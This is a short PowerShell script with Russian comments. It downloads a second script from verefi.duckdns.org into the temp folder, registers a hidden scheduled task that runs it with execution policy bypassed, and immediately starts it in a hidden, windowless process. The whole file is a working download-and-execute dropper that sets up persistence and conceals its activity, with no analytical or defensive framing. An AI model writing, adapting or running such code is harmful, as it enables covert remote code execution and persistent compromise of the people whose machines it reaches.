$taskName = "VerefiTask"

$tempDir = $env:TEMP
$ps1FileName = "verefi.ps1"
$downloadUrl = "http://verefi.duckdns.org/verefy.ps1"

$ps1Path = Join-Path -Path $tempDir -ChildPath $ps1FileName
$workDir  = $tempDir


Invoke-WebRequest -Uri $downloadUrl -OutFile $ps1Path -UseBasicParsing -ErrorAction Stop

try {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction Stop
} catch {
}
$action = New-ScheduledTaskAction `
    -Execute "powershell.exe" `
    -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ps1Path`"" `
    -WorkingDirectory $workDir

$trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddYears(10))

# Настройки — максимально скрытые
$settings = New-ScheduledTaskSettingsSet `
    -Hidden `
    -StartWhenAvailable `
    -MultipleInstances IgnoreNew `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -ExecutionTimeLimit (New-TimeSpan -Minutes 0)

# Регистрируем задачу
Register-ScheduledTask `
    -TaskName $taskName `
    -Action $action `
    -Trigger $trigger `
    -Settings $settings `
    -Description "Hidden background launch of verefi.ps1" `
    -Force | Out-Null

$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "powershell.exe"
$psi.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ps1Path`""
$psi.WorkingDirectory = $workDir
$psi.UseShellExecute = $false
$psi.CreateNoWindow = $true
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden

$proc = New-Object System.Diagnostics.Process
$proc.StartInfo = $psi
$null = $proc.Start()